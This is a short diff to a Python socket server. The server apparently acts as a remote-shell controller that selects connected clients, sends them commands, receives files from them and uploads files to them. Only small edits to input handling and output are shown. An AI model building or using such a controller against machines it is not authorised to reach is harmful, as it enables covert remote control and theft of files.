@@ -47,7 +47,7 @@ while True:
     clients.append(str(a))
     refresh()
   except KeyboardInterrupt:
-    pr('\n')
+    pr('\r')
     activate = int(input('Enter option: '))
     
     Send(socks[activate], 'activate')
@@ -66,10 +66,11 @@ while True:
       close(sock, client)
       break
 
+    # ⬇️
     if data.endswith(b'FILEXXX'):
       data = data[:-7].split(b'FILENAMEXXX')
       d = b''.join(data[:-1])
-      fn = data[-1].decode()
+      fn = data[-1].decode() # to str
       try:
         f = open(fn, 'wb')
       except IOError:
@@ -77,18 +78,15 @@ while True:
       f.write(d)
       f.close()
 
-    elif data.decode() == 'exit ok':
-      active = False
-      close(sock, client)
-      break
-
     else:
-      sys.stdout.write(data.decode())
+      print(data.decode())
 
-    nc = input() # next cmd
+    nc = ''
+    while(not nc):
+      nc = input().strip()
 
-    if not nc.strip():
-      continue
+    if nc == '-1':
+      sys.exit()
 
     if nc.startswith('ul '):
       fn = nc.split(' ')[1]
